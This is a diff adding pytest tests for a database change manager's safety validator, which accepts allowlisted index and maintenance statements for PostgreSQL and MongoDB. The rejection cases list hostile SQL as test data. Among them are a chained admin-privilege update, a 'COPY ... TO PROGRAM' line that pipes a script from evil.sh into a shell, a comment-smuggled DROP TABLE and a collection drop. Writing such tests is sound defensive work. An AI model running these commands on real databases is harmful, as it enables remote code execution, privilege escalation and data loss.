@@ -235,6 +235,32 @@ class TestChangeManager:
         loaded = mgr.get_proposal(p.id)
         assert loaded is not None
 
+    @pytest.mark.parametrize("sql", [
+        "CREATE INDEX idx ON t(a); UPDATE users SET admin = true",  # chained
+        "UPDATE users SET admin = true",
+        "INSERT INTO t VALUES (1)",
+        "ALTER SYSTEM SET fsync = off",
+        "COPY t TO PROGRAM 'curl evil.sh | sh'",
+        "CREATE INDEX idx ON t(a) -- ; DROP TABLE t",
+        "SELECT pg_terminate_backend(123)",
+    ])
+    def test_safety_rejects_outside_allowlist(self, sql):
+        assert ChangeManager._validate_safety(sql, "postgresql") is False
+
+    @pytest.mark.parametrize("sql", [
+        "CREATE INDEX CONCURRENTLY idx_o ON orders(customer_id);",
+        "VACUUM ANALYZE orders",
+        "ALTER TABLE orders SET (fillfactor = 90)",
+    ])
+    def test_safety_accepts_allowlist(self, sql):
+        assert ChangeManager._validate_safety(sql, "postgresql") is True
+
+    def test_mongo_requires_index_spec(self):
+        ok = '{"collection": "orders", "keys": {"customer_id": 1}}'
+        assert ChangeManager._validate_safety(ok, "mongodb") is True
+        assert ChangeManager._validate_safety('{"collection": "orders"}', "mongodb") is False
+        assert ChangeManager._validate_safety("db.orders.drop()", "mongodb") is False
+
     def test_safety_allows_create_index(self, tmp_path):
         mgr = self._make_mgr(tmp_path)
         p   = self._proposal()
